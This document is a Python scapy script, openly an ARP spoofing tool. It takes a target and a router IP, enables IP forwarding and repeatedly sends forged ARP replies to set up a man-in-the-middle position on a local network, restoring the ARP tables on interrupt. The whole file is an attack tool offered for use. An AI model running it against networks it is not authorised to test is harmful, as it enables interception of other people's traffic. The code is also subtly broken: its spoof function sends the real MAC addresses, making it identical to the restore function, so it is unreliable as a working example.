import sys
import time
import os
from scapy.all import ARP, Ether,send,srp

#Function to get the mac address of the target and router
def get_mac(ip):
     try:  #creating an ARP request packet to get the mac address of the target and router
       arp_request = ARP(pdst=ip)
       broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
       arp_request_broadcast_packet = broadcast/arp_request
       #sending the packet and getting the response
       response, _ = srp(arp_request_broadcast_packet, timeout=3, verbose=False)
       if response:
           return response[0][1].hwsrc
       return None
     #failed to get the mac address of the target and router
     except Exception as e:
         print(f"Error getting MAC address for {ip}: {e}")
         
#Function to spoof the target and router
def spoof(target_ip, target_mac, router_ip, router_mac):
   try:
       #creating an ARP response packet to spoof the target and the router
       arp_response_target = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=router_ip,
        hwsrc=router_mac
        )
      #send pcket to the target
       send(arp_response_target, verbose=False)
       return True
   except Exception as e:
         print(f"Error spoofing {target_ip}: {e}")
         return False
     
#function to restore ARP tables of the target and router
def arp_restore(target_ip, target_mac, router_ip, router_mac):
    try:
        #creating an ARP response packet to restore the ARP tbles
        arp_response_target = ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=router_ip,
            hwsrc=router_mac
        )
        send(arp_response_target, verbose=False)
        return True
    except Exception as e:
        print(f"Error restoring ARP table for {target_ip}: {e}")
        return False

#main function to run the ARP spoofing attack
def main():
        #to check if the user has supplied corect number of arguments
        if len(sys.argv) != 3:
            print("arpspoofer.py <target.ip> <router.ip>")
            sys.exit(1)
        #providing the target and router ip adresses from user input
        target_ip = sys.argv[1]
        router_ip = sys.argv[2]
        #get the mac address of the target and the router
        target_mac = get_mac(target_ip)
        router_mac = get_mac(router_ip)
        #check for root privileges
        if os.geteuid() != 0:
            print("Please run the script as root.")
            sys.exit(1)
        #enabling IP forwarding to allow the attacker to forward packets between the target and router
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        print("[*] IP forwarding enabled.")
        #start arp spoofing attack
        print(f"Starting ARP spoofing attack on {target_ip} and {router_ip}...")
        while True:
            try:
                #spoof the target and the router
                spoof(target_ip, target_mac, router_ip, router_mac)#user thinks that I am the router
                spoof(router_ip, router_mac, target_ip, target_mac)#router thinks that I am the target
                time.sleep(3)
            #to resotore the ARP tables of the target and router when the user interrupts the attack    
            except KeyboardInterrupt:
                print("\nRestoring ARP tables...")
                arp_restore(target_ip, target_mac, router_ip, router_mac)
                arp_restore(router_ip, router_mac, target_ip, target_mac)
                print("ARP tables restored. Exiting...")
                sys.exit(0)
if __name__ == "__main__":
    main()
            
        
